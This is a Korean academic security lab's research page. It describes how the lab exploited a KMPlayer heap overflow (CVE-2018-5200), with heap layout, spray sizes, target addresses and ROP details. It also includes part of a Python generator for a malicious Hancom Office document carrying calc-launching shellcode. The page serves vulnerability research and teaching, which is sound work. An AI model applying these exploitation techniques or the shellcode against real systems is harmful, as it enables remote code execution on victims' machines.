---
title: "PwnLab - Research"
layout: textlay
excerpt: "PwnLab -- Research"
sitemap: false
permalink: /research/
---

## Research

![]({{ site.url }}{{ site.baseurl }}/images/respic/pwn.gif){: style="width: 40%; float: left; margin: 10px 10px"}  저희 연구실에서는 다양한 시스템에 대한 Offensive Security 연구를 수행하고 있습니다. 왼쪽은 [CVE-2018-5200](https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=30113) RCE 취약점의 Exploit 데모 영상입니다. 이러한 RCE 취약점을 공격하는 과정에서 여러가지 시스템 지식 및 익스플로잇 기술을 터득 할 수 있습니다. 예를들어 아래는 KMPlayer CVE-2018-5200 의 분석보고서 중 일부분으로서, Heap Overflow 취약점을 유발시킨 이후 최종 RCE 까지의 흐름을 이끌어내는 과정에서 어떠한 연구들이 필요한지를 엿볼 수 있습니다 (취약점 위치등의 내용은 비공개).

**힙 레이아웃 조작:** _동일한 바이트로만 구성된 페이로드로 Heap Overflow 를 길이제약 없이 (거의 없이) 길게 트리거 할수 있는 상황에서 어떻게 해야 VPTR 과 같은 실행흐름과 연관되는 포인터를 가지고있는 객체를 덮어쓸수 있는지 연구한다. 앞서 KMPlayer 가 사용하는 커스텀 힙 할당자는 2가지 정도의 size 를 기준으로 bin 을 관리하여 메모리를 할당하는 dl-malloc 스타일의 할당자임을 확인하였다. 이 경우 Windows 의 표준 LFH 와 같이 할당 알고리즘 자체가 구체적인 size 를 기반으로 할당위치를 찾는 경우보다 다양한 size 의 힙 객체들이 인접한 메모리공간에 존재할 수 있기때문에 힙 메모리 레이아웃 예측이 어려워진다._

_그러나 메모리 사용의 temporal locality 에 의해서 비슷한 종류의 데이터가 인접한 시간에 대량으로 할당되고 해제되는 일이 빈번하므로, 비록 dl-malloc 스타일의 힙이라고 해도, 스프레이 가능한 특정한 size 의 객체를 찾게되면 상당히 높은 확률로 상대적인 힙의 layout 을 예측하는것이 가능하다. 예를들어 프로그램이 데이터를 처리할때 Loop 를 돌면서 동일한 작업을 반복하는 경우가 매우 일반적인데, 이런 경우 동일한 작업에 필요한 동일한 size 의 데이터를 메모리에 연속해서 할당시키게 된다. 이 경우 해당 데이터들의 절대적인 메모리 위치가 어디가 될지는 모르지만, 해당 크기의 heap chunk 들이 서로 인접한 메모리 주소공간에 밀집하는 특성이 발생한다 (de-fragmentation). 이후 해당 chunk 들중 하나를 free 시키고 (메모리에 hole 생성) 동일한 size 의 힙 할당을 하게되면 hole 에 할당될 확률이 매우 높아진다.  다음은 이러한 상황을 시각적으로 묘사한것이다._

![]({{ site.url }}{{ site.baseurl }}/images/respic/defrag.png){: style="width: 50%; float: left; margin: 10px 10px"}

_즉, "동일한 객체가 시간적으로 비슷한 시간에 대량 할당된 이후, 일정량만 해제된 상황" 이 버그 트리거 이전에 존재했다면, 매우 높은 확률로 해당 객체들이 밀집된 영역에 우리가 원하는 힙 할당이 이루어지게 할 수 있다. 이런 조건을 만족하며 대량 할당된 객체중에 VPTR 과 같은 포인터를 내장하고 있고, Heap Overflow 이벤트 발생 이후에 참조되어 사용되는 객체를 찾는다면 exploit 에 가장 이상적일 것이다._
 
_실험적으로 모든 사이즈에 대한 테스트를 하며 찾아보니 0x24 의 크기를 갖는 객체중에 이러한 성질을 정확히 만족하는 객체를 찾을 수 있었다. 그것이 정확하게 무슨용도로 사용되는 객체인지는 파악하지 못하였으나, 90% 이상의 확률로 Heap Overwrite 직후에 call [ecx-4] 와 같은 형태로 VPTR 을 사용한다는 것을 확인하였다. 따라서 H.263 스트림의 첫 Key Frame 버퍼의 크기가 0x24 바이트가 되도록 해상도를 설정하고, 이후의 Inter Frame 의 해상도는 이보다 훨씬 크게 만들면서 Inter Frame 의 픽셀이 모두 동일한 바이트 (예를들어 0xCC) 로 구성되게 FLV 헤더를 구성하게되면 call [0xCCCCCCC-4] 를 실행할 수 있다. 남은일은 0xCCCCCCCC 와 같은 위치에 우리가 원하는 정확한 ROP 체인 등이 위치하도록 힙을 적절하게 스프레이 할 방법을 찾는것이다._
 
**힙 스프레이 방법론:** _힙 스프레이는 Application 및 OS 와 기타 상황에따라 그 전략이 매우 상이할 수 있다. 먼저, 가장 중요한것은 "EIP Hijack 이 일어나는 시점에서 임의의 데이터가 메모리에 대량으로 할당된 상태를 만드는것이 가능한가?" 라는 점이다. FLV 컨테이너를 파싱하는 과정이 어떻게 이루어지느냐에 따라 이것은 가능할수도, 불가능할수도 있다. 파일내부의 데이터 자체는 MapViewOfFile 등과 같은 형태로 매핑이 되기때문에, 파일 사이즈 자체가 아무리 크다고해도, 메모리상에 그 데이터들이 할당된 상태로 존재하지는 않는다. 다만 파일내용의 여러 잔재들이 메모리에 위치할 수는 있지만, 이는 많더라도 수 MB 이하이기 때문에 32비트의 가상주소공간을 예측시키기 위한 양으로 충분하지 않다._

_보편적인 OS 인 64bit Windows 7, 8, 10 을 가정하는 경우 32bit Application 의 일반적인 메모리 레이아웃은 어느정도 예측가능하게 구성된다. 대량의 Chunk 들을 힙에 집어넣을 때 또한가지 이슈가 되는것은 힙의 Alignment (정렬) 이다. 작은 사이즈의 객체들을 수없이 많이 힙에 할당시키게 되면, 각각의 객체들이 특정 숫자의 배수로 정렬되게 되는데, 여기서는 8 의 배수에 정렬된다. 이 정보는 Heap Spray 의 대략적인 영역을 예측했을때 정확한 pointer 위치를 계산하기 위해 매우 중요한 정보가 된다. 하지만 여기서의 버그는 정상적인 VPTR 포인터와 같은 값을 자유롭게 덮어쓸 수 있는 상황이 아니라 0x61616161 과 같은 동일 바이트의 반복패턴인 32비트 값으로만 메모리를 덮을수가 있다. 따라서 Heap Spray 측면에서도 더욱더 제약이 커진다. 여러가지 연구를 진행해 본 결과 상당히 큰 사이즈의 alloc 을 유발시켜 힙 스프레이가 가능하다면, 64bit Windows 운영체제의 32bit Application 메모리 레이아웃을 잡는 방식이 ASLR 존재 하에서도 매우 높은확률로 예측가능하다는 것을 알 수 있었다. allocation 사이즈를 매우 높게 키우게되면 힙의 alignment 가 8바이트에서 "Page granularity” 가 되는데, 이는 exploit 을 하기에 아주 편리한 상황을 만들어 준다. 다음 그림은 Page 입상도의 할당을 통해서 힙스프레이를 하는 것을 묘사한다._

 ![]({{ site.url }}{{ site.baseurl }}/images/respic/spray.png){: style="width: 40%; float: right; margin: 10px 10px"}

_Windows 7, 8, 10 기준 64비트 운영체제의 32비트 어플리케이션의 경우, ASLR 하에서도 0x00000000 ~ 0x10000000 의 영역은 일반적으로 CRT heap 과 Base Image 및 작은 size 의 LFH 세그먼트들이 위치한다. 또한 kernel32.dll 등과 같은 시스템 DLL 들은 0x60000000 ~ 0x80000000 정도의 영역에서 ASLR 에 의해 랜덤하게 움직인다. 결국 0x10000000 정도에서부터 0x60000000 정도까지 1GB 정도의 공간이 비게되는데, 그렇다는것은 1GB 이상의 메모리 할당을 한 뒤에는 0x80000000 이후의 공간만 남게 된다는 것이다. 연구결과 KMPlayer에서 수KB 정도 단위의 연속된 힙 할당으로 512MB 정도의 Audio 데이터를 (동일한 timestamp 를 가진 여러개의 패킷들) 처리하게 만들면 그림상의 1GB Empty Space 를 모두 소진한 뒤 0x80000000 이후의 주소공간을 사용하게 된다. 이때 Video 쓰레드에서 버그가 터지기보다 조금먼저 Audio 쓰레드에서 힙 스프레이를 해야 하는데, 싱글코어 CPU 인 경우 Audio 쓰레드의 힙 스프레이속도가 줄어들어서 exploit 의 안정성이 떨어진다. 힙 스프레이와 exploit 트리거링이 비슷한 시점에 두 쓰레드에서 같이 일어나야 하기 때문에, 싱글코어보다 멀티코어 CPU 의 환경에서 exploit 이 안정적으로 작동한다.  분석결과 0x80000000 이후의 영역은 ASLR 로 인해 영향받는 엔트로피가 매우 미미함을 알 수 있었다. 따라서 이 영역에 Page Granularity 로 힙스프레이를 하는경우 0x99999999 등과 같은 주소에 매우 높은 확률로 우리가 원하는 데이터들이 위치하게 만드는것이 가능했다. Windows 7 과 8 은 동일하게 760MB 정도의 힙 스프레이로 0x98989898 정도의 위치에 안정적으로 스프레이한 ROP 체인을 넣을 수 있었고, Windows 10 의 경우 여러 가지 추가 라이브러리들 때문에 레이아웃이 조금 달라져서 512MB 의 스프레이로 0xA8A8A8A8 에 안정적으로 넣을 수 있었다._
 
**쉘코드 실행:** _힙 레이아웃을 컨트롤하고 힙 스프레이를 성공적으로 할수있는 단계가 된 이후에는 ASLR 이 적용되지 않은 Base Image 로부터 스택피벗 등에 필요한 가젯을 찾고 ROP 로 RWX 메모리에 쉘코드를 위치시키고 점프하는것으로 계산기를 실행한다. 퍼징을 통한 버그발견 (3~4주), 버그의 분석및 이해 (1~2주), 힙 레이아웃 제어 (1~2주) 의 난이도에 비하면 ROP 및 쉘코드실행은 1~2시간 정도 소요되는 간단한 작업이다. 먼저 call [ecx-4] 로 EIP 를 가져오므로 [ecx] 에 ROP 체인을 위치시키고 xchg ecx, esp 로 스택을 피벗하면 곧바로 ROP 를 수행할 수 있다. xchg ecx, esp 가젯이 잘 없어서 push/pop 등을 조합하여 결과적으로 동일한 피벗을 수행하는 가젯을 0x00c35644 의 위치에서 찾았다. ROP 단계에 도달한 후에는 IAT 에 존재하는 VirtualProtect 를 이용해서 Heap Spray 속 쉘코드에 실행권한을 주고 쉘코드로 점프하면 시연 영상과 같이 계산기가 실행된다._


<br><br>


![]({{ site.url }}{{ site.baseurl }}/images/respic/pwn2.gif){: style="width: 50%; float: left; margin: 10px  10px"}
왼쪽은 한컴오피스 문서파싱 프로그램의 RCE 취약점 Exploit 데모 영상입니다. 해당 버그는 힙 메모리에서의 Use-After-Free 와 같은
취약점으로 인해 발생하게 되며 (취약점은 패치 되었습니다), 이러한 버그를 RCE 까지 이끌어내는 과정에서는 Reverse Engineering (역공학) 이 필요하고, 효과적인
역공학을 수행하기 위해서는 메모리 분석, 어셈블리 코드 분석, 디버거의 사용법 등도 중요하지만 무엇보다도 풍부한 소프트웨어 개발에 관한 심도있는 경험 및 지식이 필요합니다.
예를 들어, 메모리 레이아웃과 어셈블리코드를 디버거를 통해서 아무리 열심히 분석한다고 해도 소프트웨어에 대한 개발경험이 부족하다면
분석대상 바이너리가 어떠한 프로그래밍 언어와 개발환경을 통해서 제작된 것인지 알기 어려우며, 이것은 역공학을 통한 프로그램의 로직을
이해하는데 큰 영향을 주게 됩니다.

또한 역공학을 통해서 Exploit 을 개발하기 위해서는 기본적인 프로그래밍 능력이 요구됩니다. 아래의 코드는 왼쪽 데모영상에서 사용된 RCE 를 수행하게 해주는 조작된 문서파일을
생성하기 위한 파이썬 코드의 일부분 예시를 보여줍니다. 이러한 <U>Exploit 코드개발을 통해서 소프트웨어의 내부 동작 과정 및 프로그래밍의 원리등을
심도있게 연구 할 수 있습니다.</U> 

```python
from pythoncom import *
import sys, zlib, struct, random, string

# common stuffs
p  = lambda x: struct.pack("<L", x)
pq = lambda x: struct.pack("<Q", x)
ph = lambda x: struct.pack("<H", x)
pb = lambda x: struct.pack("<B", x)

# STGM constants
STGM_READ 		= 0x00000000
STGM_READWRITE 	= 0x00000002
STGM_SHARE_EXCLUSIVE 	= 0x00000010
STGM_CONVERT 		= 0x00020000
STGM_CREATE		= 0x00001000

# STGC constants
STGC_DEFAULT		= 0x0

# STGTY constants
STGTY_STORAGE		= 0x1
STGTY_STREAM		= 0x2 
STGTY_LOCKBYTES	= 0x3
STGTY_PROPERTY		= 0x4

# Winexec(calc.exe)
SHELLCODE =  '''
90 64 A1 30 00 00 00 8B 40 0C 8B 40 14 8B 00 8B 00
8B 58 10 90 8B 7B 3C 90 03 FB 90 90 8B 7F 78 90
03 FB 57 90 8B 77 20 90 03 F3 90 90 8B 4F 24 90
03 CB 90 90 33 D2 90 68 57 69 6E 44 5F 81 C7 00
00 00 01 90 42 AD 39 3C 03 75 F9 90 90 0F B7 54
51 FE 5F 90 8B 77 1C 90 8B FB 90 90 03 F7 03 3C
96 33 D2 90 33 C0 52 90 BD 63 61 6C 64 81 ED 00
00 00 01 90 55 54 58 90 52 50 90 90 FF D7 90
'''.replace('\n', '').replace(' ', '').decode('hex')


def gen_random_str(N):
	return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

def hexdump(src, length=16):
        FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
        lines = []
        for c in xrange(0, len(src), length):
                chars = src[c:c+length]
                hex = ' '.join(["%02x" % ord(x) for x in chars])
                printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
                lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
        return ''.join(lines)

def zlib_inflate(data):
	return zlib.compress(data)[2:-4]

def zlib_deflate(data):
	return zlib.decompress(data, -15)

# payload length should be even number.
def append_paratext(payload, end=0):
	z = ''
	l = len(payload)

	# PARAHEADER
	size = 24
	tag = 66
	level = 0
	head = (size << 20) | (level << 10) | tag				
	z += struct.pack('<I', head)
	if end==1:
		z += struct.pack('<I', (l/2 + 1) | 0x80000000) 
	else:
		z += struct.pack('<I', l/2 + 1) 
	z += ''.join("00 00 00 00 0c 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00".split()).decode('hex')

	# PARATEXT
	if l > 4094:	# big
		size = 0xFFF
		tag = 67
		level = 1
		head = (size << 20) | (level << 10) | tag				
		z += struct.pack('<I', head) + struct.pack('<I', l+2) + payload + '\x0d\x00'
	else:
		size = l + 2
		tag = 67
		level = 1
		head = (size << 20) | (level << 10) | tag				
		z += struct.pack('<I', head) + payload + '\x0d\x00'
	
    ...

```

<br>


위와 같은 메모리 버그로 인한 보안 취약점들은 Fuzzing 이라는 방법으로 탐색을 자동화 할 수 있으며 관련해서 수많은
연구들이 수행되고 있습니다. [Fuzzing@Home](http://fuzzcoin.gtisc.gatech.edu:8000) 은 이러한 Fuzzing 프로그램을
비신뢰 이기종 단말로 구성된 분산 컴퓨팅 네트워크에서 효율적으로 수행할 수 있는 인프라를 구축한 연구입니다. 아래의 그림은
Fuzzing@Home 시스템의 일부분으로, Google 의 libfuzzer 를 Web Assembly 바이너리로 포팅하여 웹 브라우저 엔진 내부에서
실행시킬 수 있도록 한 것을 나타냅니다.

![]({{ site.url }}{{ site.baseurl }}/images/respic/fuzzhome2.png){: style="width: 95%; float: center; margin: 10px 10px"}

<br>

현재 퍼징을 통해 Google 에서는 수많은 메모리 버그들을 자동적으로 발견하고 패치하고 있습니다. 또한, 컴파일러 보안 기술의 발달로 인해
대다수의 메모리 버그들은 점점더 RCE Exploit 단계까지 가는데에 어려움이 있습니다. 저희 연구실에서는 전통적인 메모리 버그에 관한
연구 뿐 만 아니라, 앞으로 IT 시장에서 클라우드 서버가 늘어날 것을 예상하여 <U>가상화 및 Container, SandBox 에 관한 보안문제, 임베디드 시스템
및 드론시스템 등 여러가지 시스템에서 구성요소들 간의 상호작용에서 발생 할 수 있는 로직버그의 발견을 효과적으로 하기위한 연구</U> 또한 중점적으로 수행합니다.





